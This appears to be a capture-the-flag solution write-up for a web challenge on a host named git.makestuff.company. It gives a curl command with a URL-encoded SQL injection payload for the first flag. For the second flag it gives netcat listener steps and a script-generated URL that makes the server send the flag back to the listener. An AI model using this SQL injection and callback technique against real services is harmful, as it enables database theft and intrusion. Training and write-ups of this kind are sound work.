# A Terrible Sequel Solution

# First Flag

`curl git.makestuff.company:5000/results/'nothing%27%20;%20select%20*%20from%20prescup;--'`

# Second Flag:

1. Get your VM's IP address: `ip addr`
2. Open a second terminal and run NC in listen mode: `nc -lp 12345`
3. Write the accompanying solution script [script.py](./script.py), replacing the IP_ADDRESS and NC_PORT variables with the address
 you found and whatever port you used for the NC listener, if it was not 12345.
4. `python3 script.py` assuming that you named the written script will generate a URL.
5. Copy the URL.
6. Access the URL with `curl`.
7. `curl git.makestuff.company:5000/reload`
8. Wait 5-10 seconds, and you should receive the flag in the NC listener terminal.
